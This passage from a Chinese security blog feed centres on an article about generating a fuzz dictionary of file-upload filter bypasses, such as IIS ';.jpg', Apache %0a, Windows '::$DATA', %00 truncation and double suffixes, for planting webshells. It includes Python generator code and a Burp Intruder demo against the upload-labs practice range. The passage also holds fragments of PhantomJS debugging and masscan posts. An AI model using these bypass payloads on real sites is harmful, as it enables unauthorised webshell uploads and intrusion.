class="line">phantom.exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我使用升级后的脚本模板，重新加入上周编写错误的前端加密调用代码。这次完美的报错了，提示如下：</p><p><img src="/articles/2018/solve-jsEncrypter-script-error-code-is-not-wrong/phantomjs_server_error_info.png" alt="图1-phantomjs_server.js报错"></p><p>这里简单跟大家说明下报错信息的含义。</p><p>Message为错误消息，内容如下。大概知道错误为类型错误，<code>a.pad</code>未定义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: undefined is not an object (evaluating &apos;a.pad&apos;)</span><br></pre></td></tr></table></figure><p>STACK为堆栈跟踪，根据堆栈跟踪信息可以知道以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8.错误在函数_doFinalize()|文件aes.js 28行</span><br><span class="line">7.错误在函数finalize()|文件aes.js 25行</span><br><span class="line">6.错误在函数encrypt()|文件aes.js 29行</span><br><span class="line">5.错误在函数encrypt()|文件aes.js 25行</span><br><span class="line">4.错误在函数encrypt()|文件aes.js 25行</span><br><span class="line">3.错误在函数encrypt()|文件encrypt.js 27行</span><br><span class="line">2.错误在函数js_encrypt()|文件phantomjs_server.js 20行</span><br><span class="line">1.错误在phantomjs_server.js 38行</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;这样就跟我们的编程语言当中的报错堆栈跟踪很类似了。我们根据报错信息，然后顺着报错堆栈跟踪链很快就能定位到错误位置和原因了XD。</p><p>填坑先到这里吧，也不早了，晚安！</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://thief.one/2017/03/31/Phantomjs%E6%AD%A3%E7%A1%AE%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">【phantomjs系列】Phantomjs正确打开方式</a></li><li><a href="https://stackoverflow.com/questions/31322029/phantomjs-error-handling" target="_blank" rel="noopener">PhantomJS error handling</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;用过我的&lt;a href=&quot;https://github.com/c0ny1/jsEncrypter&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;jsEncrypter&lt;/a&gt;插件的朋友，可能会有一个遇到一个
      
    
    </summary>
    
      <category term="编程开发" scheme="http://gv7.me/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="jsEncrypter" scheme="http://gv7.me/tags/jsEncrypter/"/>
    
  </entry>
  
  <entry>
    <title>构造优质上传漏洞fuzz字典</title>
    <link href="http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/"/>
    <id>http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/</id>
    <published>2018-11-04T15:55:10.000Z</published>
    <updated>2019-02-16T18:05:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：<code>大小写混合</code>，<code>.htaccess</code>,<code>解析漏洞</code>，<code>00截断</code>，<code>.绕过</code>，<code>空格绕过</code>，<code>::$DATA绕过</code>，以及多种姿势的组合等等。当遇到一个上传点，如何全面的利用以上姿势测试一遍，并快速发现可以成功上传webshell的姿势？</p><p><strong>方案一:一个一个手工测试</strong></p><p>手工把所有姿势测试一遍，先不说花费大量时间，还很可能会遗漏掉某些姿势而导致无法利用成功。</p><p><strong>方案二:fuzz</strong></p><p>在fuzz时我们往往会给一个输入点喂入大量特殊的数据。这个特殊的数据可能随机的，毫无规律的，甚至我们都无法预知的。但我思考了一下，这样的fuzz方式只是适合在本地fuzz 0day漏洞，并不适合通过fuzz在线网站的上传点，快速找出可以成功上传webshell的payload，因为时间成本排在哪里。</p><p>通过思考，我们可以知道如果能根据上传漏洞的场景（后端语言，中间件，操作系统）来生成优质的fuzz字典，然后使用该字典进行fuzz，就能消除以上两个解决方案的弊端！</p><h2 id="一、构想"><a href="#一、构想" class="headerlink" title="一、构想"></a>一、构想</h2><p>在动手之前我们来思考下上传漏洞跟那些因素有关：</p><p><strong>一、可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等</strong></p><p><strong>二、大小写混合，如果系统过滤不严，可能大小写可以绕过。</strong></p><p><strong>三、中间件，每款中间件基本都解析漏洞,比如iis就可以把xxx.asp;.jpg当asp来执行。</strong></p><p><strong>四、系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。</strong></p><p><strong>五、语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。</strong></p><p><strong>六、双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。</strong></p><p>整理以上思考，我们把生成字典的规则梳理为以下几条</p><ol><li>可解析的后缀+大小写混合</li><li>可解析的后缀+大小写混合+中间件漏洞</li><li>.htaccess + 大小写混合</li><li>可解析的后缀+大小写混合+系统特性</li><li>可解析的后缀+大小写混合+语言漏洞</li><li>可解析的后缀+大小写混合+双后缀</li></ol><p>下面我们根据上面的构想，来分析每一方面的细节，并使用代码来实现。</p><h2 id="二、可解析后缀"><a href="#二、可解析后缀" class="headerlink" title="二、可解析后缀"></a>二、可解析后缀</h2><p>其实很多语言都这样，有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全。以下我收集相对比较全面的可解析后缀，为后面生成字典做材料。</p><table><thead><tr><th align="left">语言</th><th align="left">可解析后缀</th></tr></thead><tbody><tr><td align="left">asp/aspx</td><td align="left">asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</td></tr><tr><td align="left">php</td><td align="left">php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</td></tr><tr><td align="left">jsp</td><td align="left">jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</td></tr></tbody></table><h2 id="三、大小写混合"><a href="#三、大小写混合" class="headerlink" title="三、大小写混合"></a>三、大小写混合</h2><p>有些网站过滤比较简单，只是过滤了脚本后缀，但是没有对后缀进行统一转换为小写，在进行判断。这就纯在一个大小写问题。这里我们可以编写两个函数，一个函数是传入一个字符串，函数返回该字符串所有大小写组合的可能，第二个函数是基于第一个函数，把一个list的传入返回一个list内所有字符的所有大小写组合的可能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 字符串大小写混合，返回字符串所有大写可能</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_case_mixing</span><span class="params">(word)</span>:</span></span><br><span class="line">str_list = []</span><br><span class="line">word = word.lower()</span><br><span class="line">tempWord = copy.deepcopy(word)</span><br><span class="line">plist = []</span><br><span class="line">redict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> range( len( tempWord ) ):</span><br><span class="line">char = word[char]</span><br><span class="line">plist.append(char) </span><br><span class="line">num = len( plist )</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range( num ):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range( i , num + <span class="number">1</span> ):</span><br><span class="line">sContent = <span class="string">''</span>.join( plist[<span class="number">0</span>:i] )</span><br><span class="line">mContent = <span class="string">''</span>.join( plist[i:j] )</span><br><span class="line">mContent = mContent.upper()</span><br><span class="line">eContent = <span class="string">''</span>.join( plist[j:] )</span><br><span class="line">content = <span class="string">'''%s%s%s'''</span> % (sContent,mContent,eContent)</span><br><span class="line">redict[content] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> redict.keys():</span><br><span class="line">str_list.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line"><span class="comment">## list大小写混合</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_case_mixing</span><span class="params">(li)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> li:</span><br><span class="line">res += uperTest(l)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="四、中间件的漏洞"><a href="#四、中间件的漏洞" class="headerlink" title="四、中间件的漏洞"></a>四、中间件的漏洞</h2><p>这块是比较复杂的一块。首先我们先来梳理下</p><h3 id="4-1-iis"><a href="#4-1-iis" class="headerlink" title="4.1 iis"></a>4.1 iis</h3><p>iis一共有三个解析漏洞：</p><p>1.IIS6.0文件解析 xx.asp;.jpg<br>2.IIS6.0目录解析 xx.asp/1.jpg<br>3.IIS 7.0畸形解析 xxx.jpg/x.asp</p><p>由于2和3和上传的文件名无关，故我们只根据1来生成fuzz字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iis_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> suffix:</span><br><span class="line">str =<span class="string">'%s;.%s'</span> % (l,allow_suffix)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="4-2-apache"><a href="#4-2-apache" class="headerlink" title="4.2 apache"></a>4.2 apache</h3><p>apache相关的解析漏洞有两个：</p><ol><li>%0a(CVE-2017-15715)</li><li>未知后缀 test.php.xxx</li></ol><p>根据以上构造<code>apache_suffix_builder</code>函数生成规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apache_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> suffix:</span><br><span class="line">str = <span class="string">'%s.xxx'</span> % l</span><br><span class="line">res.append(str)</span><br><span class="line">str = <span class="string">'%s%s'</span> % (l,urllib.unquote(<span class="string">'%0a'</span>)) <span class="comment">#CVE-2017-15715</span></span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="4-3-nginx"><a href="#4-3-nginx" class="headerlink" title="4.3 nginx"></a>4.3 nginx</h3><p>nginx解析漏洞有三个：</p><ol><li>访问连接加/xxx.php test.jpg/xxx.php</li><li>畸形解析漏洞 test.jpg%00xxx.php</li><li>CVE-2013-4547 test.jpg(非编码空格)\0x.php</li></ol><p>nginx的解析漏洞，由于和上传的文件名无关，故生成字典无需考虑。</p><h3 id="4-4-tomcat"><a href="#4-4-tomcat" class="headerlink" title="4.4 tomcat"></a>4.4 tomcat</h3><p>tomcat用于上传绕过的有三种,不过限制在windows操作系统下。</p><ol><li>xxx.jsp/</li><li>xxx.jsp%20</li><li>xxx.jsp::$DATA</li></ol><p>根据以上规则生成字典对应的代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">win_tomcat = [<span class="string">'%20'</span>,<span class="string">'::$DATA'</span>,<span class="string">'/'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tomcat_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> suffix:</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> win_tomcat:</span><br><span class="line">str = <span class="string">'%s%s'</span> % (l,t)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>如果确定中间件为apache,可以加入.htaccess。同时如果操作系统还为windows，我们可以大小写混合。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (middleware == <span class="string">'apache'</span> <span class="keyword">or</span> middleware == <span class="string">'all'</span>) <span class="keyword">and</span> (os == <span class="string">'win'</span> <span class="keyword">or</span> os == <span class="string">'all'</span>):</span><br><span class="line">htaccess_suffix = uperTest(<span class="string">".htaccess"</span>)</span><br><span class="line"><span class="keyword">elif</span> (middleware == <span class="string">'apache'</span> <span class="keyword">or</span> middleware == <span class="string">'all'</span>) <span class="keyword">and</span> os == <span class="string">'linux'</span>:</span><br><span class="line">htaccess_suffix = [<span class="string">'.htaccess'</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">htaccess_suffix = []</span><br></pre></td></tr></table></figure><h3 id="4-5-语言，中间件与操作系统的关系"><a href="#4-5-语言，中间件与操作系统的关系" class="headerlink" title="4.5 语言，中间件与操作系统的关系"></a>4.5 语言，中间件与操作系统的关系</h3><p>以上我们根据每个中间件的漏洞，编写了对应的fuzz字典生成函数。在最终生成字典时，我们还要考虑中间件可以运行那些语言，以及它们与平台的关系。</p><table><thead><tr><th align="left">语言</th><th align="center">IIS</th><th align="center">Apache</th><th align="center">Tomcat</th><th align="center">Window</th><th align="center">Linux</th></tr></thead><tbody><tr><td align="left">asp/aspx</td><td align="center">√</td><td align="center">√</td><td align="center">×</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="left">php</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="left">jsp</td><td align="center">√</td><td align="center">×</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr></tbody></table><p>根据上表，我们明白</p><ul><li>iis下可以运行asp/aspx,php,jsp脚本，故这3种脚本语言可解析后缀均应该传入iis_suffix_builder()进行处理</li><li>apache下可以运行asp/aspx,php。故这2两种脚本语言可解析后缀均应该传入apache_suffix_builder()进行处理</li><li>tomcat下可以运行php，jsp，故这两个脚本语言可解析后缀均应该传入tomcat_suffix_builder()进行处理。</li><li>注意：根据对tomcat上传的绕过分析，发现之后在windows平台下才能成功。故之后在Windows平台下才会调用<code>tomcat_suffix_builder()</code>对可解析后缀进行处理。</li></ul><p>故伪代码可以编写如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> middleware == <span class="string">'iis'</span>:</span><br><span class="line">case_asp_php_jsp_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line">middleware_parse_suffix = iis_suffix_creater(case_asp_php_jsp_parse_suffix)</span><br><span class="line"><span class="keyword">elif</span> middleware == <span class="string">'apache'</span>:</span><br><span class="line">case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix</span><br><span class="line">middleware_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)</span><br><span class="line"><span class="keyword">elif</span> middleware == <span class="string">'tomcat'</span> <span class="keyword">and</span> os == <span class="string">'linux'</span>:</span><br><span class="line">middleware_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line"><span class="keyword">elif</span> middleware == <span class="string">'tomcat'</span> <span class="keyword">and</span> (os == <span class="string">'win'</span> <span class="keyword">or</span> os == <span class="string">'all'</span>):</span><br><span class="line">case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line">middleware_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">case_asp_php_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix</span><br><span class="line">iis_parse_suffix = iis_suffix_creater(case_asp_php_parse_suffix)</span><br><span class="line">case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix</span><br><span class="line">apache_parse_suffix = apache_build(case_asp_php_html_parse_suffix)</span><br><span class="line">case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line">tomcat_parse_suffix = tomcat_build(case_php_jsp_parse_suffix)</span><br><span class="line">middleware_parse_suffix = iis_parse_suffix + apache_parse_suffix + tomcat_parse_suffix</span><br></pre></td></tr></table></figure><h2 id="五、系统特性"><a href="#五、系统特性" class="headerlink" title="五、系统特性"></a>五、系统特性</h2><p>经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。</p><ul><li>Windows下文件名不区分大小写，Linux下文件名区分大写欧西</li><li>Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php</li><li>Windows下文件名结尾加入<code>.</code>,<code>空格</code>,<code>&lt;</code>,·<code>&gt;</code>,<code>&gt;&gt;&gt;</code>,<code>0x81-0xff</code>等字符，最终生成的文件均被windows忽略。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成0x81-0xff的字符list</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_81_to_ff</span><span class="params">()</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">129</span>,<span class="number">256</span>):</span><br><span class="line">str = <span class="string">'%x'</span> % i</span><br><span class="line">str = <span class="string">'%'</span> + str</span><br><span class="line">str = urllib.unquote(str)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">windows_os = [<span class="string">' '</span>,<span class="string">'.'</span>,<span class="string">'/'</span>,<span class="string">'::$DATA'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'%20'</span>,<span class="string">'%00'</span>] + str_81_to_ff()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">windows_suffix_builder</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> suffix:</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> windows_os:</span><br><span class="line">str = <span class="string">'%s%s'</span> % (s,w)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="六、语言的漏洞"><a href="#六、语言的漏洞" class="headerlink" title="六、语言的漏洞"></a>六、语言的漏洞</h2><p>语言漏洞被利用于上传的有%00截断和0x00截断。它们在asp，php和jsp中都存在着。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_00_truncation</span><span class="params">(suffix,allow_suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> suffix:</span><br><span class="line">str = <span class="string">'%s%s.%s'</span> % (i,<span class="string">'%00'</span>,allow_suffix)</span><br><span class="line">res.append(str)</span><br><span class="line">str = <span class="string">'%s%s.%s'</span> % (i,urllib.unquote(<span class="string">'%00'</span>),allow_suffix)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="七、双后缀"><a href="#七、双后缀" class="headerlink" title="七、双后缀"></a>七、双后缀</h2><p>有些站点通过对上传文件名进行删除敏感字符（php,asp,jsp等等）的方式进行过滤,例如你上传一个aphp.jpg的文件，那么上传之后就变成了a.jpg。这时就可以利用双后缀的方式上传一个a.pphphp,最终正好生成a.php。其实双后缀与中间件和操作系统无关，而是和代码逻辑有关。</p><p>针对双后缀，我们可以写个<code>str_double_suffix_creater(suffix)</code>函数，传入后缀名suffix即可生成所有的双后缀可能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_double_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(suffix)):</span><br><span class="line">str = list(suffix)</span><br><span class="line">str.insert(i,suffix)</span><br><span class="line">res.append(<span class="string">""</span>.join(str))</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>在<code>list_double_suffix_creater(suffix)</code>函数基础上，<br>可以编写<code>list_double_suffix_creater(list_suffix)</code>来为一个list生成所有双后缀可能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_double_suffix_creater</span><span class="params">(list_suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> list_suffix:</span><br><span class="line">res += double_suffix_creater(l)</span><br><span class="line"><span class="keyword">return</span> duplicate_removal(res)</span><br></pre></td></tr></table></figure><h2 id="八、整合代码"><a href="#八、整合代码" class="headerlink" title="八、整合代码"></a>八、整合代码</h2><p>上面我们针对和上传漏洞相关的每个方面进行了细致的分析，也提供了相关的核心代码。最终整合后的代码限于边幅，就放在github上了。</p><p><strong>github：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python upload-fuzz-dic-builder.py -h</span><br><span class="line">usage: upload-fuzz-dic-builder [-h] [-n] [-a] [-l] [-m] [--os] [-d] [-o]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -n , --upload-filename</span><br><span class="line">                        Upload file name</span><br><span class="line">  -a , --allow-suffix   Allowable upload suffix</span><br><span class="line">  -l , --language       Uploaded script language</span><br><span class="line">  -m , --middleware     Middleware used in Web System</span><br><span class="line">  --os                  Target operating system type</span><br><span class="line">  -d, --double-suffix   Is it possible to generate double suffix?</span><br><span class="line">  -o , --output         Output file</span><br></pre></td></tr></table></figure><p>脚本可以之定义生成的上传文件名（-n），允许的上传的后缀（-a），后端语言（-l），中间件(-m),操作系统（–os），是否加入双后缀（-d）以及输出的字典文件名（-o）。我们可以根据场景来生成合适的字典，提供的信息越详细，脚本生成的字典越精确。</p><h2 id="九、案例"><a href="#九、案例" class="headerlink" title="九、案例"></a>九、案例</h2><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>靶场的Pass0-3到Pass-10其实都是关于后缀的，在不知道代码的情况下，我们如何快速发现可以绕过的后缀呢？这时我们就可以使用<code>upload-fuzz-dic-builder.py</code>脚本生成fuzz字典，来进行fuzz。这里我选择Pass-09来给大家演示。</p><h4 id="1-利用脚本生成fuzz字典。"><a href="#1-利用脚本生成fuzz字典。" class="headerlink" title="1.利用脚本生成fuzz字典。"></a>1.利用脚本生成fuzz字典。</h4><p>由于知道我们的后端语言为<code>php</code>,中间件为<code>apache</code>，操作系统为<code>Windows</code>。所以可以利用这些信息生成更精确的fuzz字典。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python upload-fuzz-dic-builder.py -l php -m apache --os win</span><br><span class="line">[+] 收集17条可解析后缀完毕！</span><br><span class="line">[+] 加入145条可解析后缀大小写混合完毕！</span><br><span class="line">[+] 加入152条中间件漏洞完毕！</span><br><span class="line">[+] 加入37条.htaccess完毕！</span><br><span class="line">[+] 加入10336条系统特性完毕！</span><br><span class="line">[+] 去重后共10753条数据写入upload_fuzz_dic.txt文件</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/make-upload-vul-fuzz-dic/upload_fuzz_dic.png" alt="图1-生成的字典"></p><h4 id="2-抓包使用burp的Intruder模块对上传名称进行fuzz"><a href="#2-抓包使用burp的Intruder模块对上传名称进行fuzz" class="headerlink" title="2.抓包使用burp的Intruder模块对上传名称进行fuzz"></a>2.抓包使用burp的Intruder模块对上传名称进行fuzz</h4><p>抓取upload-labs的Pass-09的上传包，发送到Intruder模块，加载第一步脚本生成的fuzz字典，对上传的包的文件名进行fuzz。</p><p><img src="/articles/2018/make-upload-vul-fuzz-dic/fuzz_result.png" alt="图2-fuzz结果"></p><p>经过测试，通过fuzz可以快速找到可以突破upload-labs那些基于后缀的Pass的payload。甚至fuzz出同一个Pass多种绕过的方法。</p><p><strong>本文已在freebuf上首发：<a href="https://www.freebuf.com/articles/web/188464.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/188464.html</a></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：&lt;code&gt;大小写混合&lt;/code&gt;，&lt;code&gt;.htaccess&lt;/code&gt;,&lt;code&gt;解析漏洞&lt;/code&gt;，&lt;code&gt;00截断&lt;/code&gt;，&lt;code&gt;.绕过&lt;/code&gt;
      
    
    </summary>
    
      <category term="编程开发" scheme="http://gv7.me/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="fuzz" scheme="http://gv7.me/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>编写masscan报告转换脚本</title>
    <link href="http://gv7.me/articles/2018/masscan-report-converter/"/>
    <id>http://gv7.me/articles/2018/masscan-report-converter/</id>
    <published>2018-09-28T12:51:51.000Z</published>
    <updated>2019-02-16T18:05:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于nmap扫描比较慢，有时候需要使用masscan对大段ip进行快速扫描。为了后续方便数据处理，往往需要将数据以xls的形式进行统计，但是masscan只支持xml,json,list等格式输出,并不支持直接输出xls格式。最近有正好这个需求，于是写了个小脚本来转换一下。</p><h2 id="一、编码"><a href="#一、编码" class="headerlink" title="一、编码"></a>一、编码</h2><h4 id="file-masscan-report-converter-py"><a href="#file-masscan-report-converter-py" class="headerlink" title="file: masscan-report-converter.py"></a>file: masscan-report-converter.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 